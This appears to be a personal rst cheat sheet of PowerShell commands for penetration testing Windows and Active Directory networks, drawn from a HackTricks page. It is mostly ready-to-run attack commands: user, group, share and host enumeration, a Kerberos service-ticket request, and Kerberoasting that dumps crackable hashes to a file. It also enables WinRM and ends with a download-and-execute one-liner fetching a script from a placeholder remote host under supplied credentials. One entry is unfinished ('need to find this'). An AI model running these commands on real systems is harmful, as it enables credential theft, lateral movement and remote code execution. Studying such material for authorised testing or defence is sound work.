Windows Powershell Commands
*****************************

# https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters

Request Service Ticket with Kerberos
######################################

.. code-block:: console

   Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/xor-app23.xor.com:1433'

Enumerate Users
###################

.. code-block:: console

   Get-NetUser | select cn
   Get-LocalUser | ft Name,Enabled,Description,LastLogon
   Get-ChildItem C:\Users -Force | select Name

Enumerate Groups
##################

.. code-block:: console

   Get-NetGroup

Enumerate shared folders
############################

.. code-block:: console

   Get-NetShare

Find other computers in the network
#######################################

.. code-block:: console

   Get-NetComputer

Find other OS in network
#############################

.. code-block:: console

        Get-NetComputer -fulldata | select operatingsystem

Find Windows OS name and other info
########################################

.. code-block:: console

   systeminfo /fo csv | ConvertFrom-Csv | select OS*, System*, Hotfix* | Format-List

Invoke Kerberos and the krg5t hash
######################################

.. code-block:: console

   Import-Module .\Invoke-Kerberoast.ps1 ; Invoke-Kerberoast -Identity sqlServer -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.txt

Invoke-kerberos.ps1 file
###########################

.. code-block:: console

   need to find this

Enable WinRM (Remote PS)
###########################

.. code-block:: console

   enable-psremoting -force #This enables winrm
   Get-NetConnectionProfile |
     Where{ $_.NetWorkCategory -ne 'Private'} |
     ForEach {
       $_
       $_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
     }

OS Version
###############

Current OS version

.. code-block:: console

   [System.Environment]::OSVersion.Version 

SUDO
######

Create a Credential Object

.. code-block:: console

        $pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

For local

.. code-block:: console

   Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://<RHOST>:<RPORT>/ipst.ps1')"

   


